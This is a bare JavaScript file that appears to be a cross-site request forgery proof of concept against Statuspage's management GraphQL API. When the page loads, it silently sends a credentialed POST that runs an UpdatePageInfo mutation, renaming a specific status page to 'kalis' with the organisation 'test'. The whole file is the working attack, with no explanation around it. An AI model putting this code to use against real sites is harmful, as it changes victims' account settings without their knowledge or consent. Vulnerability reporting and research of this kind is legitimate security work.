

function loadDoc1() {
  var xhttp = new XMLHttpRequest();

  xhttp.open("POST", "https://manage.statuspage.io/graphql", true);

  xhttp.setRequestHeader("Content-type", "application/json");

  xhttp.withCredentials = true;
  xhttp.send(JSON.stringify([{
  operationName: "UpdatePageInfo",
  variables: {
    input: {
      pageId: "YXJpOmNsb3VkOnN0YXR1c3BhZ2UtYXBpOjI2cTBnMWMzMWM0ODpwYWdlL2N0eXp4djZwbTlubg==",
      pageName: "kalis",
      organizationName: "test",
      companyWebsiteUrl: null,
      supportUrl: null,
      privacyPolicyUrl: null,
      smsCountryCode: "us",
      googleAnalyticsTrackingId: null,
      hiddenFromSearch: false,
      rawTimeZone: "UTC"
    }
  },
  query: `mutation UpdatePageInfo($input: UpdatePageInfoInput!) {
    updatePageInfo(input: $input) {
      success
      errors {
        name
        message
        __typename
      }
      __typename
    }
  }`
}]));

}

window.onload = loadDoc1;
